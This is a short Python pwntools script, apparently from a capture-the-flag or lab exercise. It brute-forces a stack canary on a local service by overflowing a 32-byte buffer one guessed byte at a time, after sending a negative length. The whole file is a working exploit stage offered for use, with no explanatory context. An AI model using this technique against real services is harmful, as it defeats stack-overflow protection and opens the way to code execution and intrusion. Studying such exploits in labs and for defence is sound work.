from pwn import *
import time

context.log_level = 'ERROR'
canary = b''
search = 0x00
fill = b'A'*0x20
start = time.time()
while( len(canary) <= 4 ):
  r = remote('localhost', 60000 )
  r.sendlineafter('\n> ', str( -1 ) )
  r.sendafter('> ', fill + canary + chr(search).encode() )
  #r.interactive()
  if( r.recvline().startswith(b'Ok') ):
    print("[%d]: '%c'"%( len(canary), chr(search) ) )
    canary += chr(search).encode()
    search = 0x00
    continue
  search += 1
  if( search > 0xff ):
    print("search over 0xff")
    exit(1)
end = time.time()
print(" find  canary  ")
print(" canary is '%s' "%canary.decode(errors='backslashreplace'))
print("time: %d:%d"%( (int(end-start))//60, (int(end-start))%60 ) )
